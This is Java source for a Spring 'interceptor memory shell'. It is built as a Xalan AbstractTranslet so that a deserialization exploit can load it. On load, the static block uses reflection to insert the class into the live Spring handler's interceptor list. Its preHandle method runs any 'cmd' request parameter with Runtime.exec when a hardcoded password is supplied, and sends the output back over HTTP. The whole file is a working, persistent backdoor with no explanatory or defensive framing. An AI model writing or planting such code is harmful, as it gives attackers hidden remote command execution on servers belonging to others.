import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.springframework.context.ConfigurableApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.servlet.HandlerInterceptor;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.util.List;

public class SpringInterceptorShell extends AbstractTranslet implements HandlerInterceptor{
    public static Field getField (final Class<?> clazz, final String fieldName ) throws Exception {
        try {
            Field field = clazz.getDeclaredField(fieldName);
            if ( field != null )
                field.setAccessible(true);
            else if ( clazz.getSuperclass() != null )
                field = getField(clazz.getSuperclass(), fieldName);

            return field;
        }
        catch ( NoSuchFieldException e ) {
            if ( !clazz.getSuperclass().equals(Object.class) ) {
                return getField(clazz.getSuperclass(), fieldName);
            }
            throw e;
        }
    }
    public static Object getFieldValue(final Object obj, final String fieldName) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        return field.get(obj);
    }


    static {
        try {
            ConfigurableApplicationContext context = (ConfigurableApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
            RequestMappingHandlerMapping requestMappingHandlerMapping = (RequestMappingHandlerMapping)context.getBean("requestMappingHandlerMapping");
            List<HandlerInterceptor> adaptedInterceptors = (List<HandlerInterceptor>)getFieldValue(requestMappingHandlerMapping,"adaptedInterceptors");

            HandlerInterceptor handlerInterceptor = new SpringInterceptorShell();
            adaptedInterceptors.add(handlerInterceptor);

        }catch (Exception e){
            e.printStackTrace();
        }
    }
    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
    @Override
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
        String passwd = request.getParameter("passwd");
        if (passwd != null && passwd.equals("1nhann")){
            Runtime rt = Runtime.getRuntime();
            String cmd = request.getParameter("cmd");
            Process process = rt.exec(cmd);
            java.io.InputStream in = process.getInputStream();
            PrintWriter writer = response.getWriter();
            java.io.InputStreamReader resultReader = new java.io.InputStreamReader(in);
            java.io.BufferedReader stdInput = new java.io.BufferedReader(resultReader);
            String s = null;
            while ((s = stdInput.readLine()) != null) {
                writer.println(s);
            }
            writer.flush();
            writer.close();
        }
        return true;
    }
}
